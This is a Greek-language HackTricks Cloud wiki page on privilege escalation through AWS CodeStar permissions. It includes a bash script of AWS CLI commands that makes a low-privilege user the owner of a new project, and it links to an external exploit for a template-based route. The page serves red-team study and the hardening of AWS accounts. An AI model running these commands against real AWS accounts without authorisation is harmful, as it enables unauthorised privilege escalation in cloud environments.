# AWS - Codestar Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Codestar

Μπορείτε να βρείτε περισσότερες πληροφορίες σχετικά με το codestar στο:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `iam:PassRole`, `codestar:CreateProject`

Με αυτές τις άδειες μπορείτε να **καταχραστείτε έναν ρόλο IAM του codestar** για να εκτελέσετε **τυχαίες ενέργειες** μέσω ενός **προτύπου cloudformation**. Ελέγξτε την παρακάτω σελίδα:

{% content-ref url="iam-passrole-codestar-createproject.md" %}
[iam-passrole-codestar-createproject.md](iam-passrole-codestar-createproject.md)
{% endcontent-ref %}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

Αυτή η τεχνική χρησιμοποιεί το `codestar:CreateProject` για να δημιουργήσει ένα έργο codestar, και το `codestar:AssociateTeamMember` για να κάνει έναν χρήστη IAM τον **ιδιοκτήτη** ενός νέου έργου CodeStar, το οποίο θα τους παραχωρήσει μια **νέα πολιτική με μερικές επιπλέον άδειες**.
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
Αν είστε ήδη **μέλος του έργου**, μπορείτε να χρησιμοποιήσετε την άδεια **`codestar:UpdateTeamMember`** για να **ενημερώσετε το ρόλο σας** σε ιδιοκτήτη αντί για `codestar:AssociateTeamMember`.

**Πιθανές Επιπτώσεις:** Privesc στην πολιτική codestar που δημιουργήθηκε. Μπορείτε να βρείτε ένα παράδειγμα αυτής της πολιτικής στο:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `codestar:CreateProjectFromTemplate`

1. **Δημιουργία Νέου Έργου:**
* Χρησιμοποιήστε την ενέργεια **`codestar:CreateProjectFromTemplate`** για να ξεκινήσετε τη δημιουργία ενός νέου έργου.
* Μετά την επιτυχή δημιουργία, η πρόσβαση παρέχεται αυτόματα για **`cloudformation:UpdateStack`**.
* Αυτή η πρόσβαση στοχεύει συγκεκριμένα σε μια στοίβα που σχετίζεται με τον ρόλο IAM `CodeStarWorker-<generic project name>-CloudFormation`.
2. **Ενημέρωση της Στοίβας Στόχου:**
* Με τις παραχωρημένες άδειες CloudFormation, προχωρήστε στην ενημέρωση της καθορισμένης στοίβας.
* Το όνομα της στοίβας θα συμμορφώνεται συνήθως με ένα από τα δύο πρότυπα:
* `awscodestar-<generic project name>-infrastructure`
* `awscodestar-<generic project name>-lambda`
* Το ακριβές όνομα εξαρτάται από το επιλεγμένο πρότυπο (αναφορά στο παράδειγμα exploit script).
3. **Πρόσβαση και Άδειες:**
* Μετά την ενημέρωση, αποκτάτε τις δυνατότητες που έχουν ανατεθεί στον **ρόλο IAM CloudFormation** που συνδέεται με τη στοίβα.
* Σημείωση: Αυτό δεν παρέχει από μόνο του πλήρη δικαιώματα διαχειριστή. Μπορεί να απαιτούνται επιπλέον κακώς ρυθμισμένοι πόροι εντός του περιβάλλοντος για να αυξηθούν περαιτέρω τα δικαιώματα.

Για περισσότερες πληροφορίες, ελέγξτε την αρχική έρευνα: [https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/).\
Μπορείτε να βρείτε το exploit στο [https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py)

**Πιθανές Επιπτώσεις:** Privesc στον ρόλο IAM cloudformation.

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
